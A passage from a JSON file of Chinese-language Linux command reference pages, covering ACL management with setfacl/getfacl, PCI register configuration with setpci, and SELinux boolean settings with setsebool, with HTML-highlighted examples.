class=\"hljs-keyword\">a</span> mylove                 <span class=\"hljs-comment\">#设置为环境变量</span>\n</code></pre>\n<p>执行该命令后，将会新添加对应的环境变量。用户可以使用env命令和grep命令分别显示和搜索环境变量\"mylove\"，输入命令如下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">env</span> | grep mylove             <span class=\"hljs-comment\">#显示环境变量值</span>\n</code></pre>\n<p>此时，该命令执行后，将输出查询到的环境变量值。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "setfacl",
        "des": "设置文件访问控制列表",
        "body": "<h1 id=\"setfacl\">setfacl</h1>\n<p>设置文件访问控制列表</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>setfacl命令</strong> 是用来在命令行里设置ACL（访问控制列表）。在命令行里，一系列的命令跟随以一系列的文件名。</p>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">b</span><span class=\"hljs-string\">,</span>--<span class=\"hljs-comment\">remove</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">all：删除所有扩展的acl规则，基本的acl规则(所有者，群组，其他）将被保留。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">k</span><span class=\"hljs-string\">,</span>--<span class=\"hljs-comment\">remove</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">default：删除缺省的acl规则。如果没有缺省规则，将不提示。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">n，</span>--<span class=\"hljs-comment\">no</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">mask：不要重新计算有效权限。setfacl默认会重新计算ACL</span> <span class=\"hljs-comment\">mask，除非mask被明确的制定。</span>\n--<span class=\"hljs-comment\">mask：重新计算有效权限，即使ACL</span> <span class=\"hljs-comment\">mask被明确指定。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">d，</span>--<span class=\"hljs-comment\">default：设定默认的acl规则。</span>\n--<span class=\"hljs-comment\">restore=file：从文件恢复备份的acl规则（这些文件可由getfacl</span> <span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">R产生）。通过这种机制可以恢复整个目录树的acl规则。此参数不能和除</span>--<span class=\"hljs-comment\">test以外的任何参数一同执行。</span>\n--<span class=\"hljs-comment\">test：测试模式，不会改变任何文件的acl规则，操作后的acl规格将被列出。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">R，</span>--<span class=\"hljs-comment\">recursive：递归的对所有文件及目录进行操作。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">L，</span>--<span class=\"hljs-comment\">logical：跟踪符号链接，默认情况下只跟踪符号链接文件，跳过符号链接目录。</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">P，</span>--<span class=\"hljs-comment\">physical：跳过所有符号链接，包括符号链接文件。</span>\n--<span class=\"hljs-comment\">version：输出setfacl的版本号并退出。</span>\n--<span class=\"hljs-comment\">help：输出帮助信息。</span>\n--<span class=\"hljs-comment\">：标识命令行参数结束，其后的所有参数都将被认为是文件名</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">：如果文件名是</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">，则setfacl将从标准输入读取文件名。</span>\n</code></pre>\n<ul>\n<li>  选项<code>-m</code>和<code>-x</code>后边跟以acl规则。多条acl规则以逗号(,)隔开。选项<code>-M</code>和<code>-X</code>用来从文件或标准输入读取acl规则。</li>\n<li>  选项<code>--set</code>和<code>--set-file</code>用来设置文件或目录的acl规则，先前的设定将被覆盖。</li>\n<li>  选项<code>-m(--modify)</code>和<code>-M(--modify-file)</code>选项修改文件或目录的acl规则。</li>\n<li>  选项<code>-x(--remove)</code>和<code>-X(--remove-file)</code>选项删除acl规则。</li>\n</ul>\n<p>当使用-M，-X选项从文件中读取规则时，setfacl接受getfacl命令输出的格式。每行至少一条规则，以#开始的行将被视为注释。</p>\n<p>当在不支持ACLs的文件系统上使用setfacl命令时，setfacl将修改文件权限位。如果acl规则并不完全匹配文件权限位，setfacl将会修改文件权限位使其尽可能的反应acl规则，并会向standard error发送错误消息，以大于0的状态返回。</p>\n<p> <strong>权限</strong> </p>\n<p>文件的所有者以及有<code>CAP_FOWNER</code>的用户进程可以设置一个文件的acl。（在目前的linux系统上，root用户是唯一有<code>CAP_FOWNER</code>能力的用户）</p>\n<p> <strong>ACL规则</strong> </p>\n<p>setfacl命令可以识别以下的规则格式：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">[d<span class=\"hljs-comment\">[efault]</span>:]</span> <span class=\"hljs-comment\">[u<span class=\"hljs-comment\">[ser]</span>:]</span>uid <span class=\"hljs-comment\">[:perms]</span>  指定用户的权限，文件所有者的权限（如果uid没有指定）。\n<span class=\"hljs-comment\">[d<span class=\"hljs-comment\">[efault]</span>:]</span> g<span class=\"hljs-comment\">[roup]</span>:gid <span class=\"hljs-comment\">[:perms]</span>   指定群组的权限，文件所有群组的权限（如果gid未指定）\n<span class=\"hljs-comment\">[d<span class=\"hljs-comment\">[efault]</span>:]</span> m<span class=\"hljs-comment\">[ask]</span><span class=\"hljs-comment\">[:]</span> <span class=\"hljs-comment\">[:perms]</span>     有效权限掩码\n<span class=\"hljs-comment\">[d<span class=\"hljs-comment\">[efault]</span>:]</span> o<span class=\"hljs-comment\">[ther]</span> <span class=\"hljs-comment\">[:perms]</span>       其他的权限\n</code></pre>\n<p>恰当的acl规则被用在修改和设定的操作中，对于uid和gid，可以指定一个数字，也可指定一个名字。perms域是一个代表各种权限的字母的组合：读<code>-r</code>写<code>-w</code>执行<code>-x</code>，执行只适合目录和一些可执行的文件。pers域也可设置为八进制格式。</p>\n<p> <strong>自动创建的规则</strong> </p>\n<p>最初的，文件目录仅包含3个基本的acl规则。为了使规则能正常执行，需要满足以下规则。</p>\n<ul>\n<li><p>  3个基本规则不能被删除。</p>\n</li>\n<li><p>  任何一条包含指定的用户名或群组名的规则必须包含有效的权限组合。</p>\n</li>\n<li><p>  任何一条包含缺省规则的规则在使用时，缺省规则必须存在。</p>\n</li>\n<li><p><em>ACL的名词定义</em>* </p>\n</li>\n</ul>\n<p>先来看看在ACL里面每一个名词的定义，这些名词我大多从man page上摘下来虽然有些枯燥,但是对于理解下面的内容还是很有帮助的。</p>\n<p>ACL是由一系列的Access Entry所组成的，每一条Access Entry定义了特定的类别可以对文件拥有的操作权限。Access Entry有三个组成部分：Entry tag type, qualifier (optional), permission。</p>\n<p>我们先来看一下最重要的Entry tag type，它有以下几个类型：</p>\n<pre><code class=\"language-shell\">ACL<span class=\"hljs-emphasis\">_USER_OBJ：相当于Linux里file_owner的permission\nACL_USER：定义了额外的用户可以对此文件拥有的permission\nACL_GROUP_OBJ：相当于Linux里group的permission\nACL_GROUP：定义了额外的组可以对此文件拥有的permission\nACL_MASK：定义了ACL_USER, ACL_GROUP_OBJ和ACL_GROUP的最大权限 (这个我下面还会专门讨论)\nACL_</span>OTHER：相当于Linux里other的permission\n</code></pre>\n<p>让我们来据个例子说明一下，下面我们就用getfacl命令来查看一个定义好了的ACL文件：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-meta\"># getfacl ./test.txt</span>\n<span class=\"hljs-meta\"># file: test.txt</span>\n<span class=\"hljs-meta\"># owner: root</span>\n<span class=\"hljs-meta\"># group: admin</span>\n<span class=\"hljs-symbol\">user:</span>:rw-\n<span class=\"hljs-symbol\">user:</span>john:rw-\n<span class=\"hljs-symbol\">group:</span>:rw-\n<span class=\"hljs-symbol\">group:</span>dev:r--\n<span class=\"hljs-symbol\">mask:</span>:rw- other::r--\n</code></pre>\n<p>前面三个以#开头的定义了文件名，file owner和group。这些信息没有太大的作用，接下来我们可以用<code>--omit-header</code>来省略掉。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">user</span>::rw-       定义了ACL_USER_OBJ, 说明file <span class=\"hljs-keyword\">owner</span>拥有<span class=\"hljs-keyword\">read</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">write</span> permission\n<span class=\"hljs-keyword\">user</span>:john:rw-   定义了ACL_USER,这样用户john就拥有了对文件的读写权限,实现了我们一开始要达到的目的\n<span class=\"hljs-keyword\">group</span>::rw-      定义了ACL_GROUP_OBJ,说明文件的<span class=\"hljs-keyword\">group</span>拥有<span class=\"hljs-keyword\">read</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">write</span> permission\n<span class=\"hljs-keyword\">group</span>:dev:r<span class=\"hljs-comment\">--   定义了ACL_GROUP,使得dev组拥有了对文件的read permission</span>\nmask::rw-       定义了ACL_MASK的权限为<span class=\"hljs-keyword\">read</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">write</span>\nother::r<span class=\"hljs-comment\">--      定义了ACL_OTHER的权限为read</span>\n</code></pre>\n<p>从这里我们就可以看出ACL提供了我们可以定义特定用户和用户组的功能，那么接下来我们就来看一下如何设置一个文件的ACL：</p>\n<p> <strong>如何设置ACL文件</strong> </p>\n<p>首先我们还是要讲一下设置ACL文件的格式，从上面的例子中我们可以看到每一个Access Entry都是由三个被：号分隔开的字段所组成，第一个就是Entry tag type。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">user</span>   <span class=\"hljs-title\">对应了ACL_USER_OBJ</span>和ACL_USER\n<span class=\"hljs-keyword\">group</span>  <span class=\"hljs-title\">对应了ACL_GROUP_OBJ</span>和<span class=\"hljs-keyword\">ACL_GROUP</span>\n<span class=\"hljs-title\">mask</span>   对应了ACL_MASK\nother  对应了ACL_OTHER\n</code></pre>\n<p>第二个字段称之为qualifier，也就是上面例子中的john和dev组，它定义了特定用户和拥护组对于文件的权限。这里我们也可以发现只有user和group才有qualifier，其他的都为空。第三个字段就是我们熟悉的permission了。它和Linux的permission一样定义，这里就不多讲了。</p>\n<p>下面我们就来看一下怎么设置test.txt这个文件的ACL让它来达到我们上面的要求。</p>\n<p>一开始文件没有ACL的额外属性：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-variable\">@localhost</span> ~]<span class=\"hljs-comment\"># ls -l</span>\n-rw-rw-r-- <span class=\"hljs-number\">1</span> root admin 0 Jul <span class=\"hljs-number\">3</span> <span class=\"hljs-number\">22</span><span class=\"hljs-symbol\">:</span>06 test.txt\n\n[root<span class=\"hljs-variable\">@localhost</span> ~]<span class=\"hljs-comment\"># getfacl --omit-header ./test.txt</span>\nuser::rw- group::rw- other::r--\n</code></pre>\n<p>我们先让用户john拥有对test.txt文件的读写权限：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-variable\">@localhost</span> ~]<span class=\"hljs-comment\"># setfacl -m user:john:rw- ./test.txt</span>\n[root<span class=\"hljs-variable\">@localhost</span> ~]<span class=\"hljs-comment\"># getfacl --omit-header ./test.txt</span>\nuser::rw-\n<span class=\"hljs-symbol\">user:</span><span class=\"hljs-symbol\">john:</span>rw-\ngroup::rw-\nmask::rw-\nother::r--\n</code></pre>\n<p>这时我们就可以看到john用户在ACL里面已经拥有了对文件的读写权。这个时候如果我们查看一下linux的permission我们还会发现一个不一样的地方。</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># ls -l ./test.txt</span>\n-rw-rw-r--+<span class=\"hljs-number\"> 1 </span>root admin<span class=\"hljs-number\"> 0 </span>Jul<span class=\"hljs-number\"> 3 </span>22:06 ./test.txt\n</code></pre>\n<p>在文件permission的最后多了一个+号，当任何一个文件拥有了ACL_USER或者ACL_GROUP的值以后我们就可以称它为ACL文件，这个+号就是用来提示我们的。我们还可以发现当一个文件拥有了<code>ACL_USER</code>或者<code>ACL_GROUP</code>的值时<code>ACL_MASK</code>同时也会被定义。</p>\n<p>接下来我们来设置dev组拥有read permission：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-variable\">@localhost</span> <span class=\"hljs-operator\">~</span>]# setfacl <span class=\"hljs-operator\">-</span>m <span class=\"hljs-keyword\">group</span>:dev:r<span class=\"hljs-comment\">-- ./test.txt</span>\n[root<span class=\"hljs-variable\">@localhost</span> <span class=\"hljs-operator\">~</span>]# getfacl <span class=\"hljs-comment\">--omit-header ./test.txt</span>\n<span class=\"hljs-keyword\">user</span>::rw<span class=\"hljs-operator\">-</span>\n<span class=\"hljs-keyword\">user</span>:john:rw<span class=\"hljs-operator\">-</span>\n<span class=\"hljs-keyword\">group</span>::rw<span class=\"hljs-operator\">-</span>\n<span class=\"hljs-keyword\">group</span>:dev:r<span class=\"hljs-comment\">--</span>\nmask::rw<span class=\"hljs-operator\">-</span>\nother::r<span class=\"hljs-comment\">--</span>\n</code></pre>\n<p>到这里就完成了我们上面讲到的要求，是不是很简单呢。</p>\n<p> <strong>ACL_MASK和Effective permission</strong> </p>\n<p>这里需要重点讲一下<code>ACL_MASK</code>，因为这是掌握ACL的另一个关键，在Linux file permission里面大家都知道比如对于<code>rw-rw-r--</code>来说, 当中的那个<code>rw-</code>是指文件组的permission. 但是在ACL里面这种情况只是在<code>ACL_MASK</code>不存在的情况下成立。如果文件有ACL_MASK值，那么当中那个<code>rw-</code>代表的就是mask值而不再是group permission了。</p>\n<p>让我们来看下面这个例子：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># ls -l</span>\n-rwxrw-r--<span class=\"hljs-number\"> 1 </span>root admin<span class=\"hljs-number\"> 0 </span>Jul<span class=\"hljs-number\"> 3 </span>23:10 test.sh\n</code></pre>\n<p>这里说明test.sh文件只有file owner: root拥有read, write, execute/search permission。admin组只有read and write permission，现在我们想让用户john也对test.sh具有和root一样的permission。</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-variable\">@localhost</span> ~]<span class=\"hljs-comment\"># setfacl -m user:john:rwx ./test.sh</span>\n[root<span class=\"hljs-variable\">@localhost</span> ~]<span class=\"hljs-comment\"># getfacl --omit-header ./test.sh</span>\nuser::rwx <span class=\"hljs-symbol\">user:</span><span class=\"hljs-symbol\">john:</span>rwx\ngroup::rw-\nmask::rwx\nother::r--\n</code></pre>\n<p>这里我们看到john已经拥有了rwx的permission，mask值也被设定为rwx，那是因为它规定了<code>ACL_USER</code>，<code>ACL_GROUP</code>和<code>ACL_GROUP_OBJ</code>的最大值，现在我们再来看test.sh的Linux permission，它已经变成了：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># ls -l</span>\n-rwxrwxr--+<span class=\"hljs-number\"> 1 </span>root admin<span class=\"hljs-number\"> 0 </span>Jul<span class=\"hljs-number\"> 3 </span>23:10 test.sh\n</code></pre>\n<p>那么如果现在admin组的用户想要执行test.sh的程序会发生什么情况呢？它会被permission deny。原因在于实际上admin组的用户只有read and write permission，这里当中显示的rwx是<code>ACL_MASK</code>的值而不是group的permission。</p>\n<p>所以从这里我们就可以知道，如果一个文件后面有+标记，我们都需要用getfacl来确认它的permission，以免发生混淆。</p>\n<p>下面我们再来继续看一个例子，假如现在我们设置test.sh的mask为read only，那么admin组的用户还会有write permission吗？</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-variable\">@localhost</span> <span class=\"hljs-operator\">~</span>]# setfacl <span class=\"hljs-operator\">-</span>m mask::r<span class=\"hljs-comment\">-- ./test.sh</span>\n[root<span class=\"hljs-variable\">@localhost</span> <span class=\"hljs-operator\">~</span>]# getfacl <span class=\"hljs-comment\">--omit-header ./test.sh</span>\n<span class=\"hljs-keyword\">user</span>::rwx\n<span class=\"hljs-keyword\">user</span>:john:rwx   #effective:r<span class=\"hljs-comment\">--</span>\n<span class=\"hljs-keyword\">group</span>::rw<span class=\"hljs-operator\">-</span>      #effective:r<span class=\"hljs-comment\">--</span>\nmask::r<span class=\"hljs-comment\">--</span>\nother::r<span class=\"hljs-comment\">--</span>\n</code></pre>\n<p>这时候我们可以看到ACL_USER和ACL_GROUP_OBJ旁边多了个#effective:r--，这是什么意思呢？让我们再来回顾一下<code>ACL_MASK</code>的定义。它规定了<code>ACL_USER</code>，<code>ACL_GROUP_OBJ</code>和<code>ACL_GROUP</code>的最大权限。那么在我们这个例子中他们的最大权限也就是read only。虽然我们这里给<code>ACL_USER</code>和<code>ACL_GROUP_OBJ</code>设置了其他权限，但是他们真正有效果的只有read权限。</p>\n<p>这时我们再来查看test.sh的Linux file permission时它的group permission也会显示其mask的值(i.e. r--)</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># ls -l</span>\n-rwxr--r--+<span class=\"hljs-number\"> 1 </span>root admin<span class=\"hljs-number\"> 0 </span>Jul<span class=\"hljs-number\"> 3 </span>23:10 test.sh\n</code></pre>\n<p> <strong>Default ACL</strong> </p>\n<p>上面我们所有讲的都是Access ACL，也就是对文件而言。下面我简单讲一下Default ACL。Default ACL是指对于一个目录进行Default ACL设置，并且在此目录下建立的文件都将继承此目录的ACL。</p>\n<p>同样我们来做一个试验说明，比如现在root用户建立了一个dir目录：</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># mkdir dir</span>\n</code></pre>\n<p>他希望所有在此目录下建立的文件都可以被john用户所访问，那么我们就应该对dir目录设置Default ACL。</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-meta\"># setfacl -d -m user:john:rw ./dir</span>\n[root@localhost ~]<span class=\"hljs-meta\"># getfacl --omit-header ./dir</span>\nuser::rwx\ngroup::rwx\nother::r-x\n<span class=\"hljs-keyword\">default</span>:user::rwx\n<span class=\"hljs-keyword\">default</span>:user:john:rwx\n<span class=\"hljs-keyword\">default</span>:group::rwx\n<span class=\"hljs-keyword\">default</span>:mask::rwx\n<span class=\"hljs-keyword\">default</span>: other::r-x\n</code></pre>\n<p>这里我们可以看到ACL定义了default选项，john用户拥有了default的read, write, excute/search permission。所有没有定义的default都将从file permission里copy过来，现在root用户在dir下建立一个test.txt文件。</p>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-variable\">@localhost</span> ~]<span class=\"hljs-comment\"># touch ./dir/test.txt</span>\n[root<span class=\"hljs-variable\">@localhost</span> ~]<span class=\"hljs-comment\"># ls -l ./dir/test.txt</span>\n-rw-rw-r--+ <span class=\"hljs-number\">1</span> root root 0 Jul <span class=\"hljs-number\">3</span> <span class=\"hljs-number\">23</span><span class=\"hljs-symbol\">:</span><span class=\"hljs-number\">46</span> ./dir/test.txt\n\n[root<span class=\"hljs-variable\">@localhost</span> ~]<span class=\"hljs-comment\"># getfacl --omit-header ./dir/test.txt</span>\nuser::rw-\n<span class=\"hljs-symbol\">user:</span><span class=\"hljs-symbol\">john:</span>rw-\ngroup::rwx <span class=\"hljs-comment\">#effective:rw-</span>\nmask::rw-\nother::r--\n</code></pre>\n<p>这里我们看到在dir下建立的文件john用户自动就有了read and write permission，</p>\n<p> <strong>ACL相关命令</strong> </p>\n<p>前面的例子中我们都注意到了getfacl命令是用来读取文件的ACL，setfacl是用来设定文件的Acess ACL。这里还有一个chacl是用来改变文件和目录的Access ACL and Default ACL，它的具体参数大家可以去看man page。我只想提及一下<code>chacl -B</code>。它可以彻底删除文件或者目录的ACL属性(包括Default ACL)，比如你即使用了<code>setfacl -x</code>删除了所有文件的ACL属性，那个+号还是会出现在文件的末尾，所以正确的删除方法应该是用<code>chacl -B</code>用cp来复制文件的时候我们现在可以加上<code>-p</code>选项。这样在拷贝文件的时候也将拷贝文件的ACL属性，对于不能拷贝的ACL属性将给出警告。</p>\n<p>mv命令将会默认地移动文件的ACL属性，同样如果操作不允许的情况下会给出警告。</p>\n<p> <strong>需要注意的几点</strong> </p>\n<p>如果你的文件系统不支持ACL的话，你也许需要重新mount你的file system：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">mount</span> -o remount, acl<span class=\"hljs-meta\"> [mount point]</span>\n</code></pre>\n<p>如果用chmod命令改变Linux file permission的时候相应的ACL值也会改变，反之改变ACL的值，相应的file permission也会改变。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "setpci",
        "des": "查询和配置PCI设备的使用工具",
        "body": "<h1 id=\"setpci\">setpci</h1>\n<p>查询和配置PCI设备的使用工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>setpci命令</strong> 是一个查询和配置PCI设备的使用工具。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">setpci</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-v：显示指令执行的细节信息；</span>\n<span class=\"hljs-deletion\">-f：当没有任何操作需要完成时，不显示任何信息；</span>\n<span class=\"hljs-deletion\">-D：测试模式，并不真正将配置信息写入寄存器；</span>\n<span class=\"hljs-deletion\">-d：仅显示给定厂商和设备的信息；</span>\n<span class=\"hljs-deletion\">-s：仅显示指定总线、插槽上的设备或设备上的功能块信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  PCI设备：指定要配置的PCI设备；</li>\n<li>  操作：指定要完成的配置操作。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>Linux下调节笔记本屏幕亮度方法：</p>\n<p>首先进入终端输入lspci命令，列出各种设备的地址：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">lspci</span>\n<span class=\"hljs-comment\">00:00</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">0 host bridge: Intel Corporation</span> <span class=\"hljs-comment\">Mobile</span> <span class=\"hljs-comment\">945GM/PM/GMS</span><span class=\"hljs-string\">,</span> <span class=\"hljs-comment\">943/940GML</span> <span class=\"hljs-comment\">and</span> <span class=\"hljs-comment\">945GT Express Memory Controller Hub</span> <span class=\"hljs-comment\">(rev</span> <span class=\"hljs-comment\">03)</span>\n<span class=\"hljs-comment\">00:02</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">0</span> <span class=\"hljs-comment\">VGA compatible controller: Intel Corporation</span> <span class=\"hljs-comment\">Mobile</span> <span class=\"hljs-comment\">945GM/GMS</span><span class=\"hljs-string\">,</span> <span class=\"hljs-comment\">943/940GML Express Integrated Graphics Controller</span> <span class=\"hljs-comment\">(rev</span> <span class=\"hljs-comment\">03)</span>\n<span class=\"hljs-comment\">00:02</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">1 Display controller: Intel Corporation</span> <span class=\"hljs-comment\">Mobile</span> <span class=\"hljs-comment\">945GM/GMS/GME</span><span class=\"hljs-string\">,</span> <span class=\"hljs-comment\">943/940GML Express Integrated Graphics Controller</span> <span class=\"hljs-comment\">(rev</span> <span class=\"hljs-comment\">03)</span>\n<span class=\"hljs-comment\">00:1b</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">0 Audio device: Intel Corporation</span> <span class=\"hljs-comment\">N10/ICH</span> <span class=\"hljs-comment\">7 Family High Definition Audio</span> <span class=\"hljs-comment\">Controller</span> <span class=\"hljs-comment\">(rev</span> <span class=\"hljs-comment\">02)</span>\n<span class=\"hljs-comment\">00:1c</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">0</span> <span class=\"hljs-comment\">PCI bridge: Intel Corporation N10/ICH</span> <span class=\"hljs-comment\">7</span> <span class=\"hljs-comment\">Family</span> <span class=\"hljs-comment\">PCI</span> <span class=\"hljs-comment\">Express</span> <span class=\"hljs-comment\">Port</span> <span class=\"hljs-comment\">1</span> <span class=\"hljs-comment\">(rev</span> <span class=\"hljs-comment\">02)</span>\n<span class=\"hljs-comment\">00:1c</span><span class=\"hljs-string\">.</span><span class=\"hljs-comment\">1</span> <span class=\"hljs-comment\">PCI bridge: Intel Corporation N10/ICH</span> <span class=\"hljs-comment\">7</span> <span class=\"hljs-comment\">Family</span> <span class=\"hljs-comment\">PCI</span> <span class=\"hljs-comment\">Express</span> <span class=\"hljs-comment\">Port</span> <span class=\"hljs-comment\">2</span> <span class=\"hljs-comment\">(rev</span> <span class=\"hljs-comment\">02)</span>\n<span class=\"hljs-string\">.</span><span class=\"hljs-string\">.</span><span class=\"hljs-string\">.</span><span class=\"hljs-string\">.</span><span class=\"hljs-string\">.</span><span class=\"hljs-string\">.</span>\n</code></pre>\n<p>发现00:02.0是VGA设备，于是我们修改它的属性：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">sudo</span> setpci -s <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">02</span>.<span class=\"hljs-number\">0</span> F4.B=FF\n</code></pre>\n<p>解释一下：</p>\n<ul>\n<li>   <strong>setpci</strong>  是修改设备属性的命令。</li>\n<li>   <strong>-s</strong>  表示接下来输入的是设备的地址。</li>\n<li>   <strong>00:02.0</strong>  VGA设备地址（&lt;总线&gt;:&lt;接口&gt;.&lt;功能&gt;）。</li>\n<li>   <strong>F4</strong>  要修改的属性的地址，这里应该表示“亮度”。</li>\n<li>   <strong>.B</strong>  修改的长度（B应该是字节（Byte），还有w（应该是Word，两个字节）、L（应该是Long，4个字节））。</li>\n<li>   <strong>=FF</strong>  要修改的值（可以改）。</li>\n</ul>\n<p>我这里00是最暗，FF是最亮，不同的电脑可能不一样。比如说我嫌FF太闪眼了，我就可以：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">sudo</span> setpci -s <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">02</span>.<span class=\"hljs-number\">0</span> F4.B=CC\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "setsebool",
        "des": "修改SElinux策略内各项规则的布尔值",
        "body": "<h1 id=\"setsebool\">setsebool</h1>\n<p>修改SElinux策略内各项规则的布尔值</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>setsebool命令</strong> 是用来修改SElinux策略内各项规则的布尔值。setsebool命令和getsebool命令是SELinux修改和查询布尔值的一套工具组。SELinux的策略与规则管理相关命令：seinfo命令、sesearch命令、getsebool命令、setsebool命令、semanage命令。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">setsebool <span class=\"hljs-comment\">[-P]</span> 布尔值=<span class=\"hljs-comment\">[0|1]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-<span class=\"hljs-selector-tag\">P</span>:直接将设置值写入配置文件，该设置数据将来会生效的。\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>允许vsvtp匿名用户写入权限：</p>\n<pre><code class=\"language-shell\">setsebool -P <span class=\"hljs-attribute\">allow_ftpd_anon_write</span>=1\n</code></pre>\n<p>如果你希望你的ftp用户可以访问自己的家目录的话，需要开启：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">setsebool</span> -P ftp_home_dir <span class=\"hljs-number\">1</span>\n</code></pre>\n<p>如果你希望将vsftpd以daemon的方式运行的话，需要开启：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">setsebool</span> -P ftpd_is_daemon <span class=\"hljs-number\">1</span>\n</code></pre>\n<p>你可以让SElinux停止保护vsftpd的daemon方式动行：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">setsebool</span> -P ftpd_disable_trans <span class=\"hljs-number\">1</span> \n</code></pre>\n<p>HTTP被设置允许cgi的设置：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">setsebool</span> -P httpd_enable_cgi <span class=\"hljs-number\">1</span>\n</code></pre>\n<p>允许用户HHTP访问其家目录，该设定限仅于用户的家目录主页：</p>\n<pre><code class=\"language-shell\">setsebool -<span class=\"hljs-keyword\">P</span> httpd_enable_homedirs <span class=\"hljs-number\">1</span>\nchcon -<span class=\"hljs-keyword\">R</span> -t httpd_sys_content_t ~user/public_html\n</code></pre>\n<p>允许httpd访问终端：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">setsebool</span> -P httpd_tty_comm <span class=\"hljs-number\">1</span>\n</code></pre>\n<p>关闭Selinux的关于httpd进程守护的保护：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">setsebool</span> -P httpd_disable_trans <span class=\"hljs-number\">1</span>\n<span class=\"hljs-attribute\">service</span> httpd restart\n</code></pre>\n<p>关于named、master更新selinux设定：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">setsebool</span> -P named_write_master_zones <span class=\"hljs-number\">1</span>\n</code></pre>\n<p>关闭named的进程守护保护：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">setsebool</span> -P named_disable_trans <span class=\"hljs-number\">1</span>\n<span class=\"hljs-attribute\">service</span> named restart\n</code></pre>\n<p>Selinux将本机的NFS共享设置成只读：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">setsebool</span> -P nfs_export_all_ro <span class=\"hljs-number\">1</span>\n</code></pre>\n<p>SElinux将本机的NFS共享设置成可读可写：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">setsebool</span> -P nfs_export_all_rw <span class=\"hljs-number\">1</span>\n</code></pre>\n<p>如果你想要将远程NFS的家目录共享到本机，需要开启：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">setsebool</span> -P use_nfs_home_dirs <span class=\"hljs-number\">1</span>\n</code></pre>\n<p>如果samba服务器共享目录给多个域，则需要：</p>\n<pre><code class=\"language-shell\">setsebool -P <span 